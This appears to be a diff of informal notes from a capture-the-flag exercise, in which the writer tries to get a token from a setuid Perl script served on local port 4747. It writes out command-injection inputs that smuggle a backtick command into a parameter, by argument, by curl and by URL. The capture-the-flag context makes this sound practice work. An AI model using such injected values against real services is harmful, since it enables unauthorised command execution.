@@ -1,1 +1,13 @@
 oh dear, Perl
+again setuid?
+this is if you use the wrong user?
+Check flag.Here is your token :
+Nope there is no token here for you sorry. Try again :)
+this just says Check?
+perl ./level04.pl x=`getflag`
+it's also running at port 4747
+curl 127.0.0.1:4747 -d "x=`getflag`"
+Check flag.Here is your token :
+:S still don't have the token
+via a browser it does work?
+?x=`getflag`
